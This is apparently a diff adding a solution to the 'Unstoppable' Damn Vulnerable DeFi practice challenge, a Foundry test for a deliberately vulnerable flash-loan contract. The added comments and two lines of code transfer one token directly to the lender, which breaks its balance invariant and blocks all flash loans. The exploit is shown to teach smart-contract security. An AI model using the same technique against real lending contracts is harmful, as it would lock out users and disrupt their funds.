@@ -56,7 +56,22 @@ contract Unstoppable is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
+
+        // Exploit Strategy
+        //
+        // Diagnosis: The pool can be stopped from making flash loans by breaking the invariant:
+        // unstoppableLender.poolBalance() == dvt.balanceOf(address(unstoppableLender))
+        // Guiding Policy: Manipulate the ERC20 token balance of lender address, outside of depositTokens()
+        // Coherent Action:
+        //     1) Transfer tokens from attacker to lender
+        //     2) Validation – when someone next attempts to take a flash loan, the lender contract
+        //     will throw AssertionViolated() because poolBalance is less than its ERC20 token balance
+
+        vm.prank(attacker);
+        dvt.transfer(address(unstoppableLender), 1);
+
         /** EXPLOIT END **/
+
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
     }
